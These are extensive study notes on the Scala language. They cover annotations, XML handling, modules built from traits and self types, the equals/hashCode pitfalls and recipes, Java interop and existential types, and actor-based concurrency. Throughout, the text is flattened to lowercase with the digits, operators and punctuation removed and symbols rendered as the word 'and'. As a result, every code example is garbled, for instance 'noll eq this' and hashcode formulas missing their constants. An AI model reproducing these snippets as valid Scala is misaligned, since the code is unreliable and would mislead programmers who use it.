automatically generate getters and setters it conforms to java bean standard which means that a field named crazy will be supplemented with getcrazy and setcrazy  which will be available only after the compilation passes so you cannot compile code that uses those methods in that same pass tailrec annotation tailrec is added to a method that needs to be tail recursive e g if you expect that without tail recursion optimization it would recurse very deep it is used to make sure that the compiler will perform tail recursion optimization if the optimization cannot be performed you will get a warning with an explanation unchecked unchecked is interpreted by the compiler during pattern matching and it tells the compiler not to worry if the match expression left out some cases native methods native informs the compiler that a method s implementation is supplied by the runtime rather than the scala code compiler then toggles the appropriate flags in the output and it leaves out to the developer to supply the implementation using a mechanism such as java native interface jni when using this annotation a method body must be supplied but it will not be emitted into the output native def begincountdown scala lets you type in xml as a literal anywhere that en expression is valid this is old stuff and

superclass of all xml node classes class text is a node holding just unstructured text from withing a tag class nodeseq holds a sequence of nodes many methods in the xml library process node sequences in places you might expect them to process individual nodes since node extends nodeseq  you can use those methods on individual nodes you can think of an individual node as a one element node sequence

scala pattern language including binding new variables type tests and ignoring content using  and  patterns def proc node scala xml node string node match case b contents and b it s bi and contents and and loks case  is it something and and if found it binds the content to variable named contents and then evaluates the and and code to the right of the fat arrow and and usage proc b banana and b and and string it s bi banana if you want the function to match cases like the last two you ll have to match against a sequence of nodes instead of a single one the pattern for any sequence is written  def proc node scala xml node string node match case b contents  and b it s a bi and contents case  is it something else and and so now xml patterns work very nicely with for expressions as a way to iterate through some parts of an xml tree while ignoring other parts and and if you wished to skip over the white space between records in the following xml val catalog catalog cctherm description hot

case catalog therms  and catalog for therm cctherm  and cctherm therms println processing and therm description text and and processing hot dog  and and processing sprite boy and and cctherm  and cctherm restricts matches only to cctherm elements and and ignoring whitespace packages and access modifiers enable you to organize a large program using packages as modules where a module is a smaller program piece with a well defined interface and a hidden implementation while packages are quite helpful they are limited because they don t provide a way to abstract i e to reconfigure a package two different ways within the same program or to inherit between packages a package always includes one precise list of contents which stays the same until you change the code and recompile being able to compile different modules that make up a system separately helps different teams work independently being able to unplug one implementation of a module and plug in another is useful because it allows different configurations to be used in different contexts any technique that aims to provide solutions to these problems should have a module construct that provides clean separation of interface and implementation be able to replace one module with another that has the same interface without changing or recompiling the modules that depend on the replaced one be able to wire modules together can be thought of as configuring the system one approach of solving this problem is dependency injection  a technique supported by spring and guice on the java platform spring for example essentially allows you to represent the interface of a module as a java interface and implementation of a module as java classes where you can specify dependencies between modules and wire an application together via external xml configuration files with scala you have some alternatives provided by the language itself which enables you to solve the problem without using an external framework the intention is to partition our application into a domain layer and an application layer in the domain layer we ll define domain objects  which will capture business concepts and rules and encapsulate state that will be persisted to a database in the application layer we ll provide an api organized in terms of the services the application offers to clients including the user interface layer and implement these services by coordinating tasks and delegating the work to the objects of the domain layer to be able to plug in real and mock versions of certain objects in each of these layers e g to more easily write unit tests we ll treat objects that we want to mock as modules to avoid using hard link between modules we use abstract classes and then make modules inherit from these classes that way we can avoid code duplication by providing all common operations in the abstract classes when a module becomes too large to fit into a single file we can use traits to split a module into separate files self type specifies the requirements on any concrete class the trait is mixed into if you have a trait that is only ever used when mixed in with another trait or traits then you can specify that those other traits should be assumed trait simplerecipes this simplefoods and and self type and and presents a requirement to a class that mixes this trait in and and that it has to always be mixed in together with simplefoods object fruitsalad extends recipe fruit salad  list apple pear  and and this pear is in scope because of self type mix it all together def allrecipes list fruitsalad and and this is safe because any concrete class that mixes in simplerecipes must also mix and and in i e be a subtype of simplefoods  so pear will always be a member and and since abstract classes and traits cannot be instantiated with new  there is no risk and and that the this pear reference will ever fail modules can be linked together at runtime and you can decide which modules will link to which depending on runtime computations and and a simple program that chooses a database at runtime object gotapples def main args array string val db database if args  student studentdatabase else simpledatabase object browser extends browser val database db val apple simpledatabase foodnamed apple get for recipe browser recipesusing apple println recipe despite using the same code the different browser and database modules really are separate modules which means that each module has its own contents including any nested classes e g foodcategory in simpledatabase is a different class from foodcategory in studentdatabase val category studentdatabase allcategories head and and category studentdatabase foodcategory foodcategory ediblelist frozenfood simplebrowser displaycategory category and and type mismatch and and found studentdatabase foodcategory and and required simpledatabase foodcategory if you want all foodcategory objects to be the same move its definition outside of any class or trait sometimes you can encounter a situation where two types are the same but the compiler can t verify it in such cases you can often fix the problem using singleton types and and the type checker doesn t know that db and browser database are of the same type object gotapples and and same definitions as before for cat db allcategories browser displaycategory cat and and type mismatch and and found db foodcategory and and required browser database foodcategory and and to circumvent the problem inform the type checker that they are the same object object browser extends browser val database db type db singleton type is extremely specific and holds only one object in this case whichever object is referred to by db usually such types are to specific to be useful which is why the compiler is reluctant to insert them automatically the definition of equality is different in scala and java java has two equality comparisons the operator which is the natural equality for value types and object identity for reference types and the equals method which is user defined canonical equality for reference types this convention is problematic because the more natural symbol  does not always correspond to the natural notion of equality e g comparing two strings x and y using x y might well yield false in java even if x and y have exactly the same characters in the same order scala also has object reference equality method but it s not used much that kind of equality written x eq y  is true only if x and y refer to the same object the equality is reserved in scala for the natural equality of each type for value types it is value comparison just like in java but for reference types it is the same as equals that means that you can redefine the behavior of for new types by overriding the equals method which is always inherited from class any where it represents object reference equality it is not possible to override directly final in class any and and scala treats as if it was defined like this in class any final def that any boolean if noll eq this null eq that else this equals that common pitfalls when overriding equals defining equals with the wrong signature changing equals without also changing hashcode defining equals in terms of mutable fields failing to define equals as an equivalence relation defining equals with the wrong signature class point val x int val y int and and and and wrong way to define equals def equals other point boolean this x other x this y other y and and the problem is that it doesn t match the signature of equals in class any and and simple comparisons work fine but the trouble starts with points in collections import scala collection mutable  val p p new point   val coll hashset p and and mutable hashset point set point fc coll contains p and and false and and the problem is that our method equals only overloads equals in class any and and overloading in scala and in java is resolved by the static type of the argument and and not the runtime type and and so as long as the static type of the argument is point  our equals is called and and but once a static argument is of type any  the equals in any is called instead and and and since this method has not been overridden it still compares object references and and this is why p equals pa yields false  and why the contains method in and and hashset returned false  since it operates on generic sets it calls the generic and and equals method in object instead of the overloaded one in point and and a better equals with correct type but still not perfect override def equals other any other match case that point this x that x this y that y case  false and and a related pitfall is to define with a wrong signature and and normally if you try to override with the correct signature the compiler will and and give you an error because is final and and the common error two errors is to try to override with a wrong signature def other point boolean and and and and in this case the method is treated as an overloaded so it compiles changing equals without also changing hashcode  for hash based collections element of the collection are put in hash buckets determined by their hash code the contains test first determines a hash bucket to look in and then compares the given element with all elements in that bucket and if element equal to the one provided is not found the method returns false the original hashcode  in anyref  calculates hash code by some transformation of the address of the object so hash codes of p and p are different even though the fields have the same values different hash codes result with high probability with different buckets in the set the root of the problem can be described with the contract that the better equals violated if two objects are equal according to the equals method then calling the hashcode on each of the two objects must produce the same integer result  hashcode and equals should only be redefined together  hashcode may only depend on fields the equals depends on and and the suitable definition of hashcode class point val x int val y int override def hashcode   and x and y and and  is prime override def equals other any other match case that point this x that x this y that y case  false and and this hashcode should give reasonable distribution of hash codes at a low cost defining equals in terms of mutable fields and and the slight variation of class point class point var x int var y int and and notice vars override def hashcode   and x and y override def equals other any other match case that point this x that x this y that y case  false the equals and hashcode are now defined in terms of these mutable fields so their results change when fields change which can have strange effects once you put points in collections val p new point   and and point point cadd val coll hashset p and and mutable hashset point set point cadd coll contains p and and true and and now we change a field coll contains p and and false coll iterator contains p and and true and and what happened is that now hashcode evaluates to different value so contains and and looks for provided element in a wrong bucket if you need a comparison that takes the current state of an object into account you should name the method differently something other than equals  e g equalcontents failing to define equals as an equivalence relation same as java  the contract of the equals method in scala any reflexive for any non null value x  the expression x equals x should return true  symmetric for any non null values x and y  the expression x equals y should return true if and only if y equals x returns true  transitive for any non null values x  y and z  if x equals y returns true and y equals z returns true  then x equals z should return true  consistent for any non null values x and y  multiple invocations of x equals y should consistently return true or consistently return false  provided no information used in equals comparisons is modified for any non null value x  the expression x equals null should return false  the better equals definition conforms to the contract but things become more complicated when inheritance is introduced object color extends enumeration val red orange yellow green blue indigo violet value and and non symmetric equals class coloredpoint x int y int val color color value extends point x y override def equals other any other match case that coloredpoint this color that color super equals that case  false and and doesn t need to override hashcode  since this equals is stricter than point s and and so the contract for hashcode is satisfied and and if two colored points are equal they must have the same coordinates so their hash and and codes are guaranteed to be equal as well and and the equals contract becomes broken once points and color points are mixed val p new point   and and point point aeee val cp new coloredpoint   color red and and coloredpoint coloredpoint aeee p equals cp and and true invokes p s equals from class point cp equals p and and false invokes cp s equals from class coloredpoint and and so the relation defined by equals is not symmetric which can have unexpected and and consequences for collections hashset point p contains cp and and true hashset point cp contains p and and false to fix the symmetry problem you can either make the relation more general or more strict making it more general means that a pair of two objects x and y  is taken to be equal if either comparing x with y or comparing y with x yields true class coloredpoint x int y int val color color value extends point x y override def equals other any other match case that coloredpoint this color that color super equals that case that point and and special comparison for points that equals this case  false and and now both cp equals p and p equals cp result in true and and however the contract for equals is still broken now the problem is that the new and and relation is no longer transitive val redp new coloredpoint   color red val blup new coloredpoint   color blue and and taken individually redp p and and true p blup and and true redp blup and and false ok but transitivity is messed up making relation more general seems to lead to a dead end so we ll try stricter one way of making equals stricter is to always treat object of different classes as not equal and and technically valid but still not perfect equals class point val x int val y int override def hashcode   and x and y override def equals other any other match case that point this x that x this y that y this getclass that getclass case  false and and revert back to non symmetric one which is with this version of point symmetric class coloredpoint x int y int val color color value extends point x y override def equals other any other match case that coloredpoint this color that color super equals that case  false and and here an instance of class point is equal to some other instance of the same class and and only if the objects have the same field values and same runtime class and and but still an anonymous subclass of point with the same field values val anonp new point   override val y  and and point anon  ea and and is anonp equal to p logically it is but technically it isn t which is what we and and don t want in scala to redefine equality on several levels of the class hierarchy while keeping its contract we are required to redefine one more method canequal and and signature def canequal other any boolean canequal should return true if the provided object is an instance of the class in which canequal is re defined as soon as a class redefines equals  it should also explicitly state that objects of this class are never equal to objects of some superclass that implements a different equality method canequal is called from equals to make sure that the objects are comparable both ways class point val x int val y int override def hashcode   and x and y override def equals other any other match case that point that canequal this this x that x this y that y case  false def canequal other any other isinstanceof point and and all points can be equal class coloredpoint x int y int val color color value extends point x y override def hashcode  super hashcode and color hashcode override def equals other any other match case that coloredpoint that canequal this super equals that this color that color case  false override def canequal other any other isinstanceof coloredpoint val p new point   val cp new coloredpoint   color indigo val anonp new point   override val y  val coll list p and and list point list point aa coll contains p and and true coll contains cp and and false coll contains anonp and and true if superclass equals defines and calls canequal  then programmers who implement subclasses can decide whether or not their subclasses may be equal to instances of the superclass when classes are parameterized equals pattern matching scheme needs to be adapted and and binary tree with two implementations trait tree and t def elem t def left tree t def right tree t object emptytree extends tree nothing def elem throw new nosuchelementexception emptytree elem def left throw new nosuchelementexception emptytree left def right throw new nosuchelementexception emptytree right class branch and t val elem t val left tree t  val right tree t extends tree t and and implementing equals and hashcode and and no need for class tree subclasses redefine them and and no need for object emptytree anyref s implementations are fine after all and and any empty tree is only equal to itself so reference equality is just what we need and and a branch value should only be equal to other branch values and only if they and and have equal elem  left and right fields class branch and t val elem t val left tree t  val right tree t extends tree t override def equals other any other match case that branch t this elem that elem this left that left this right that right case  false and and compiling this code gives unchecked warning and and warning non variable type argument t in type pattern is unchecked since it is and and eliminated by erasure and and we saw this before compiler can only check that the other reference is some kind and and of branch it cannot check that the element type of the tree is t and and the reason for this is that element types of parameterized types are eliminated by and and the compiler s erasure phase so they are not available for inspection at runtime and and fortunately we don t even need to check that two branches have the same element and and types it s quite possible that in order to declare two branches as equal all and and we need to do is compare their fields val b new branch list string nil emptytree emptytree val b new branch list int nil emptytree emptytree b b and and true and and the result shows that the element types was not compared otherwise would be false there s only a small change needed in order to formulate equals that does not produce unchecked warning instead of element type t  use a lower case letter such as t case that branch t this elem that elem this left that left this right that right and and the reason this works is that a type parameter in a pattern starting with a lower and and case letter represents an unknown type hence the pattern match case that branch t and and will succeed for branch of any type and and it can also be replaced with the underscore case that branch  and and equivalent to the previous case with t the only thing that remains for class branch  is to define the other two methods hashcode and canequal and and the possible implementation of hashcode override def hashcode int   and elem hashcode and left hashcode and right hashcode and and canequal implementation def canequal other any other isinstanceof branch  and and branch  is a shorthand for so called existential type  which is roughly and and speaking a type with some unknown parts in it next chapter and and so even though technically the underscore stand for two different things in a match and and pattern and in a type parameter of a method call in essence the meaning is the same and and it lets you label something that is unknown equals recipe  if you re going to override equals in a non final class you should crate a canequal method if the inherited definition of equals is from anyref not redefined higher up the class hierarchy  the definition of canequal will be new otherwise it will override a previous definition of a method with the same signature the only exception to this requirement is for final classes that redefine the equals method inherited from anyref for them the subclass anomalies cannot arise consequently they need not define canequal the type of the object passed to canequal should be any def canequal other any boolean and and  the canequal method should yield true if the argument object is an instance of the current class i e the class in which canequal is defined  false otherwise other isinstanceof rational  in the equals method make sure you declare the type of the object passed as any override def equals other any boolean and and  write the body of the equals method as a single match expression the selector of the match should be the object passed to equals other match  the match expression should have two cases the first should declare a typed pattern for the type of the class on which you re defining equals case that rational  in the body of this first case write an expression that logical ands together the individual expressions that must be true for the objects to be equal if the equals you re overriding is not that of anyref  you ll most likely want to include an invocation of the superclass s equals super equals that and and if you re defining equals for a class that first introduced canequal  you should invoke canequal on the argument to the equality method passing this as the argument that canequal this and and overriding definitions of equals should also include the canequal invocation unless they contain a call to super equals in the latter case the canequal test will already be done by the superclass call for each field relevant to equality verify that the field in this object is equal to the corresponding field in the passed object numer that numer denom that denom  for the second case use a wildcard pattern that yields false case  false hashcode recipe include in the calculation each field in your object that is used to determine equality in the equals method the relevant fields for each relevant field no matter its type you can calculate a hash code by invoking hashcode on it to calculate hash code for the entire object add  to the first field s hash code multiply that by  add the second field s hash code multiply that by  add the third field s hash code multiply that by  and continue until you ve done this for all relevant fields and and hash code calculation for object with  relevant fields override def hashcode int     and a hashcode and b hashcode and c hashcode and d hashcode and e hashcode you can leave off the hashcode invocation on fields of type int  short  byte and char their hash codes are their values override def hashcode int  and numer and denom the number  was selected because it is an odd prime you could use another number but it should be an odd prime to minimize the potential for information loss on overflow the reason we add  to the innermost value is to reduce the likelihood that the first multiplication will result in zero under the assumption that it is more likely the first field will be zero than  there in addition part it could be any other non zero integer  was chosen just because of other s if the equals invokes super equals that  you should start your hashcode with an invocation of super hashcode for example had rational s equals method invoked super equals that  its hashcode would have been override def hashcode int  super hashcode and numer and denom one thing to keep in mind when defining hashcode like this is that your hash code will only be as good as the hash codes you build it out of namely the hash codes you obtain by calling hashcode on the relevant fields sometimes you may need to do something extra besides just calling hashcode on the field to get a useful hash code for that field for example if one of your fields is a collection you probably want a hash code for that field that is base on all the elements contained in the collection if the field is a list  set  map or tuple you can simply call hashcode on the field since equals and hashcode are overridden in those classes to take into account the contained elements however the same is not true for arrays which do not take their elements into account when calculating hashcode thus for an array you should treat each element of the array like an individual field of your object calling hashcode on each element explicitly or passing the array to one of the hashcode methods in singleton object java util arrays if you find that particular hash code calculation is harming the performance of your program you can consider caching the hash code if the object is immutable you can calculate the hash code when the object is created and store it in a field you can easily do this by overriding hashcode with a val instead of a def override val hashcode int  and numer and denom and and trades off memory for computation time since now each instance will have one more and and field to hold given how difficult is to correctly implement an equality method you might opt out to define your classes of comparable objects as case classes that way the scala compiler will add equals and hashcode with the right properties automatically scala code is often used in tandem with large java programs and frameworks which from time to time runs into a few common problems if you call scala code from java it s useful to understand how the whole system works and how scala code looks from a java point of view general rules scala is implemented as a translation to standard java bytecode as much as possible scala features map directly onto the equivalent java features e g classes methods strings exceptions method overloading all map directly to java there are scala features that has its own design traits for example have no equivalent in java generic types are handled completely differently scala encodes language features like these using some combination of structures java does have for features that are mapped indirectly encoding is not fixed and there is an ongoing effort to make translations as simple as possible value types a value type like int can be translated in two different ways whenever possible compiler translates a scala int to a java int to get better performance sometimes this is not possible because the compiler is not sure whether it is translating an int or some other data type e g a list any might hold only integers but the compiler cannot be sure that s the case in cases like this the compiler uses objects and relies on wrapper classes and autoboxing singleton objects translation of singleton objects uses a combination of static and instance methods for every singleton object the compiler creates a java class with a dollar sign added to the end e g for singleton app  compiler produces app  which has all the methods and fields of the singleton object the java class also has a single static field named module which holds the one instance of the class that is created at runtime and and for scala singleton object app def main args array string println hello universe and and compiler generates java code public final class app extends java lang object implements scala scalaobject public static final app module public static public app public void main java lang string public int tag and and an important special case is if you have a standalone singleton object one which does and and not come with a class of the same name and and in that case compiler creates a java class named app that has a static forwarder and and method for each method of the singleton public final class app extends java lang object public static final int tag public static final void main java lang string and and if you on the other hand have a class named app  scala would create a and and corresponding java app class to hold the members of the app class you defined and and it would not add any forwarding methods for the same named singleton object and and and java code would have to access the singleton via the module field traits as interfaces compiling any trait creates a java interface of the same name which is usable as a java type and it lets you call methods on scala objects through variables of that type implementing a trait in java is not practical with one special case being important if you make a scala trait that includes only abstract methods then that trait will be translated directly to a java interface with no other code to worry about when the compiler sees an annotation it first processes it according to the general scala rules and then it does something extra for java deprecation for any method or class marked deprecated  the compiler adds java s own deprecation annotation because of this java compiler can issue deprecation warnings when java code accesses deprecated scala methods volatile fields same as for deprecation thus volatile fields in scala behave exactly according to java s semantics and accesses to volatile fields are sequenced precisely according to the rules specified for volatile fields in java memory model serialization all of the  scala s standard serialization annotations are translated to java equivalents a serializable class has java s serializable interface added to it and and a serialversionuid l is converted to the following java definition private final static long serialversionuid l any variable marked transient is given the java transient modifier exceptions thrown scala does not check that thrown exceptions are caught that is scala has no equivalent to java s throws declaration on methods all scala methods are translated to java methods that declare no thrown exceptions the reason it all still works is that the java bytecode verifier does not check the declarations anyway the java compiler checks but not the verifier the reason this feature is omitted from scala is that the java experience with it has not been purely positive because annotating methods with throws clauses is a heavy burden for developers the result is that this often makes code less reliable programmers often in order to satisfy the compiler either throw all they can or catch and release exceptions sometimes when interfacing with java you may need to write scala code that has java friendly annotations describing which exceptions your methods may throw e g each method in java rmi is required to mention java io remoteexception in its throws clause thus if you wish to write a rmi interface as a scala trait with abstract methods you would need to list remoteexception in the throws clauses for those methods to accomplish this all you have to do is mark your methods with throws annotations and and a method marked as throwing ioexception import java io  class reader fname string private val in new bufferedreader new filereader fname throws classof ioexception def read in read and and and here is how it looks in java public class reader extends java lang object implements scala scalaobject public reader java lang string public int read throws java io ioexception and and proper java throws public int tag java annotations existing annotations from java frameworks can be used directly in scala code any java framework will see the annotations you write just as if you were writing java a wide variety of java packages use annotations e g junit  which from its version  allows you to use annotations to indicate which parts of your code are tests and and annotations required in some java libraries can be used the same way in scala import org junit test import org junit assert assertequals class settest test and and this notation may be used instead of org junit test  since we did import def testmultiadd val set set and  and  and  and  and  and  assertequals  set size writing your own annotations to make an annotation that is visible by java reflection you must use java notation and compile with javac for this use case writing the annotation in scala does not seem helpful so the standard compiler does not support it the reason is that scala support would inevitably fall short of the full possibilities of java annotations and further scala will probably one day have its own reflection in which case you would want to access scala annotations with scala reflection and and this is java import java lang annotation retention retentionpolicy runtime target elementtype method public interface ignore and and after compiling the above with javac  we can use the annotations object tests ignore and and ignores the method even though its name starts with test def testdata list      and and test methods def test assert testdata testdata head testdata tail def test assert testdata contains testdata head to see when these annotations are present you can use the java reflection api method tests getclass getmethods if method getname startswith test if method getannotation classof ignore null println found a test method and method and and this code in action javac ignore java scalac tests scala scalac findtests scala scala findtests all java types have a scala equivalent which is necessary so that scala code can access any java class most of the time the translation is straightforward pattern in java is pattern in scala iterator component in java is iterator component in scala but for some cases scala types we mentioned so far are not enough for example what can be done with java wildcard type parameters such as iterator or iterator extends component also what can be done with raw types like iterator  where the type parameter is omitted for wildcard and raw types scala uses an extra kind of type called existential type existential types are fully supported part of the language but in practice they are mainly used when accessing java types from scala we are covering this mostly so that you can understand error messages when your scala code accesses java code and and the general form of an existential type and type and forsome and declarations and and and the type part is an arbitrary scala type and and the declarations part is a list of abstract vals and types the interpretation is that the declared variables and types exist but are unknown just like abstract members of a class the type is then allowed to refer to the declared variables and types even though it is unknown what they refer to and and java iterator would be written in scala as iterator t forsome type t and and an iterator of t s for some type t and and java iterator extends component would be iterator t forsome type t component and and iterator of t for some type t that is a subtype of component and and there is a shorter way to write this examples with placeholder notation iterator  and and means the same as iterator t forsome type t and and similarly iterator t forsome type t component and and is the same as iterator  component placeholder syntax is similar to the placeholder syntax for function literals where if you use an underscore in place of an expression then scala creates a function literal for you here when you use an underscore in place of a type scala makes an existential type for you where each underscore becomes one type parameter in a forsome clause so if you use multiple underscores in the same type you will get the effect of a forsome clause with multiple types in it and and existential types usage example and and java class with wildcards public class wild collection contents collection string stuff new vector string stuff add a stuff add b stuff add see return stuff and and if you access the above class in scala val contents new wild contents and and java util collection  for some type  a b see contents size and and int  for compatibility s sake scala provides access to java s concurrent primitives wait  notify and notifyall may all be called in scala and have the same meaning as in java technically scala doesn t have the synchronized keyword instead it has a predefined synchronized method that can be called like this var counter  synchronized and and one thread at a time counter counter and  usually when you compile scala code that depends on java code you first build the java code to class files and then you build the scala code putting the java class files on the classpath this approach doesn t work if the java code has references back to scala code in that case one side will have unsatisfied external references to support such builds scala allows compiling against java source code as well as java class files all you have to do is put the java source files on the command line as if they were scala files then scala compiler won t compile those java files but it will scan them to see what they contain so the right sequence is to first compile scala using java source files and then compile java code using scala class files scalac d bin inventoryanalysis

hard to work with and prone for errors especially when programs get large and complex scala augments java s concurrency by adding actors actors provide a concurrency model that is easier to work with and can help you avoid many of the difficulties of using java s native concurrency model java s built in threading model is based on shared data and locks each object is associated with a logical monitor which is used to control multi threaded access to data in this model you decide what data will be shared by multiple threads and enclose those shared sections of the code with sinchronized blocks or methods the problem with this model is that in each point in a program you must reason about what data you re modifying or accessing that might be modified or accessed by other threads at each method call you must reason about what locks it will try to hold and convince yourself that it will not deadlock while trying to obtain those locks making things even worse testing is not reliable with multi threaded code since threads are non deterministic you might successfully test a program a thousand times and yet still the program could go wrong with this model you must get it right i e avoid deadlocks and race conditions through reason alone scala s actors library addresses the fundamental problem by providing an alternative share nothing  message passing model an actor is a thread like entity that has a mailbox for receiving messages to implement an actor you subclass scala actors actor and implement the act method import scala actors  object shakespeare extends actor def act for i  to  println to be or not to be is that a question thread sleep  and and you start an actor by invoking its start method shakespeare start and and to be or not to be is that a question and and to be or not to be is that a question actors run completely independently from one another import scala actors  object hamlet extends actor def act for i  to  println yes that was a question thread sleep  shakespeare start hamlet start and and to be or not to be is that a question and and yes that was a question and and to be or not to be is that a question and and to be or not to be is that a question and and yes that was a question and and yes that was a question you can also create an actor using a utility method named actor in object scala actors actor import scala actors actor  and and this actor starts immediately when it s defined no need to call start method val desdemona actor for i  to  print i rule thread sleep  and and i rule i rule i rule actors communicate by sending each other messages message is sent using method hamlet hi there nothing happens in this case because hamlet is too busy acting to process its messages and so the hi there message sits in its mailbox unread an actor can wait for new messages in its mailbox val parrot actor while true receive case msg println msg when an actor sends a message it does not block and when an actor receives a message it is not interrupted the message waits in the receiving actor s mailbox until the actor calls receive  passing in a partial function remember partial function is not a full function i e it might not be defined over all input values partial function literal is expressed as a series of match cases so it looks like a match expression without the match keyword it is actually an instance of the partialfunction trait in addition to apply method that takes one argument a partial function offers isdefinedat method which also takes one argument that returns true if the partial function can  handle  the passed value which then means that the value is safe to pass to apply if isdefinedat returns false and that value is passed to apply  then apply throws an exception an actor will only process messages matching one of the cases in the partial function passed to receive for each message in the mailbox receive first invokes isdefinedat on the passed partial function to determine whether it has a case that will match and handle the message the receive method then chooses the first message in the mailbox for which isdefinedat returns true  and pass that message to the partial function s apply method which then handles the message if the mailbox contains no message for which isdefinedat returns true  the actor on which receive was invoked will block until a matching message arrives and and actor that only handles ints val intparrot actor receive case x int println got int and x intparrot hello and and silently ignores it intparrot math pi and and silently ignores it intparrot  and and got int  the actor subsystem manages one or more native threads for its own use so long as you work with an explicit actor that you define you don t need to think much about how they map to threads the other direction is also supported every native thread is also usable as an actor however you cannot use thread currentthread directly because it does not have the necessary methods instead you should use actor self if you want to view the current thread as an actor this facility is especially useful for debugging actors from the interactive shell import scala actors actor  self hello self receive case x x and and any hello and and the receive method returns the value computed by the partial function passed to it and and and in this case the partial function returns the message itself so the received and and message ends up being printed out by the interpreter if you use receive in the interpreter the receive will block the shell until a message arrives in case of self receive this could mean waiting forever  thus when using this technique it s better to use a variant called receivewithin  which allows you to specify a timeout in milliseconds self receivewithin  case x x and and wait for s and and any timeout and and receivewithin processes mailbox message or waits until for new messages for and and specified number of millis threads are not cheap they consume enough memory that typical java vms which normally hosts millions of objects can have only thousands of threads moreover switching threads often takes hundreds if not thousands of processor cycles to help you conserve threads scala provides an alternative the the usual receive method called react like receive  react takes a partial function but unlike receive it does not return after it finds and processes a message its result type is nothing it evaluates the message handler and that s it throws an exception that s caught behind the scenes since react doesn t need to return the implementation doesn t need to preserve the call stack of the current thread instead the library can reuse the current thread for the next actor that wakes up this approach is so effective that if every actor in a program used react  only a single thread would be used scala utilizes all processor cores that it can in practice programs need at least a few receive s but you should try to use react whenever possible because react does not return the message handler you pass it must now both process that message and arrange to do all of the actor s remaining work a common way to do this is to have a top level work method such as act itself  that the message handler calls when it finishes object nameresolver extends actor import java net inetaddress unknownhostexception def act react case name string actor actor actor getip name act case exit println name resolver over and out and and quit case msg println unhandled message and msg act def getip name string option inetaddress try some inetaddress getbyname name catch case  unknownhostexception none nameresolver start and and scala actors actor nameresolver dda nameresolver www scala lang org  self self receivewithin  case x x and and any some www google com and     this coding pattern is so common with event base actors that there s a special support in the library for it the actor loop executes a block of code repeatedly even if the code calls react def act react case name string actor actor actor getip name case msg println unhandled message and msg it has a return type of nothing and it never returns normally i e always ends with an exception conceptually when you call start on an actor the start method will in some way arrange things so that some thread will eventually call act on that actor if the act method invokes react  the react method looks in the actor s mailbox for a message that the passed partial function can handle receive does this the same way passes candidate messages to the partial function s isdefinedat method if it finds a message that can be handled react will schedule the handling of that message for later execution and throw an exception if it doesn t find one it will place the actor in cold storage to be resurrected if and when it gets more messages in its mailbox and then throw an exception in either case react will complete abruptly with this exception and so will act the thread that invoked act will catch the exception forget about the actor and move on to do other things this explains why if you want react to handle more than the first message you have to call act again from inside your partial function or use some other means to get react invoked again actors should not block while an actor blocks some other actor might make a request on it and since it s blocked it won t even notice the request in the worst case even a deadlock may happen with multiple actors blocked as they each wait for some other blocked actor to respond instead of blocking an actor should arrange for some message to arrive designating that an action is ready to be taken this rearrangement will often require help of other actors e g instead of calling thread sleep time  you could create a helper actor that sleeps and then sends a message back when enough time has elapsed thread sleep time mainactor wakeup and and this actor blocks but since it ll never receive a message that s ok the main actor remains available to answer new requests the emotelater method demonstrates the use of this idiom it creates a new actor that will do the sleep so that the main actor does not block to ensure that the actor will send the emote message to the correct actor it is prudent to evaluate self in the scope of the main actor instead of the scope of the helper actor because this actor does not block in sleep  it can continue to do other work while waiting for its next time to emote and and actor that uses helper actor to avoid blocking itself echoes messages while waiting val sillyactor actor def emotelater val mainactor self actor thread sleep  mainactor emote var emoted  emotelater react case emote println i m really acting emoted and  if emoted  emotelater case msg println received and msg communicate with actors only via messages the key way the actors model addresses the difficulties of the shared data and locks is by providing a safe space the actor s act method where you can think sequentially i e actors allow you to write a multi threaded program as a bunch of independent single threaded programs that communicate with each other via asynchronous messages so all this works only if you abide by this simple rule that the messages are the only way you let your actors communicate nevertheless scala actors library gives you the choice of using both message passing and shared data locks in the same program a good example is multiple actors sharing a reference to a concurrenthashmap instead of using a single map owner actor and sending async messages to it and alter the map synchronously given that chm is already implemented in java concurrency library thus it s guaranteed to be safe prefer immutable messages since actors model provides a single threaded environment inside each actor s act method we don t need to worry about whether the objects are thread safe this is why the actors model is called share nothing model there s one exception in the share nothing rule the data inside objects used to send messages between actors is shared by multiple actors as a result you do have to worry about whether message object are thread safe and in general they should be the best way to ensure that message objects are thread safe is to only use immutable objects for messages remember object is immutable if it s an instance of any class that has only val fields which themselves refer only to immutable objects the easy way to define such message classes is to use case classes so long as you don t explicitly add var field to it and ensure val fields are all immutable types of course for message instances you can also use a regular immutable class you define or instances of many immutable classes provided by the scala api such as tuples strings lists immutable sets and maps and so on if an actor sends a mutable unsynchronized object as a message and never reads or writes that object thereafter it would work but it s just asking for trouble in general it s recommended that you arrange your data such that every unsynchronized mutable object is owned and therefore accessed by only one actor you can arrange for objects to be transferred from one actor to another but you need to make sure that at any given time it s clear which actor owns the object i e when you design an actor based system you need to decide which parts of mutable memory are assigned to which actor all other actors should use this object through its owner actor by passing messages to it if you happen to have a mutable object that you have to to send to another actor you should make and send a copy of it instead but while you re at it you may want to make it immutable for example arrays are mutable and unsynchronized any array you use should be accessed by one actor at a time if you want to continue using it as well as send it to another actor you should send a copy if the array holds only immutable objects you can make a copy with arr clone  but you should consider using arr tolist and send the resulting immutable list instead make messages self contained when you return a value from a method the caller is in a good position to remember what it was doing before it called the method it can take the response value and then continue doing whatever it was doing with actors things are little trickier when one actor makes a request to another the response might not come for a long time the calling actor should not block but should continue to do any other work it can while it waits for the response a difficulty then is interpreting the response when it finally does come back how can actor remember what it was doing when it made the request one way to simplify the logic of an actors program is to include redundant information in the messages if the request is an immutable object you can cheaply include a reference to the request in the return value for example the ip lookup actor would be better if it returned the host name in addition to the ip address it would make this actor slightly longer but it should simplify the logic of any actor making requests on it def act react case name string actor actor actor name getip name another way to increase redundancy in the messages is to make a case class for each kind of message that makes an actors program much easier to understand imagine a programmer looking as a send of a string for example lookerupper www scala lang org  self it can be difficult to figure out which actors in the code might respond it is much easier if the code looks like this case class lookupip hostname string requester actor lookerupper lookupip www scala lang org  self and and now the programmer can search for lookupip in the source probably finding and and very few possible responders and and updated name resolving actor that uses case classes instead of tuples as messages import scala actors actor  import java net inetaddress unknownhostexception case class

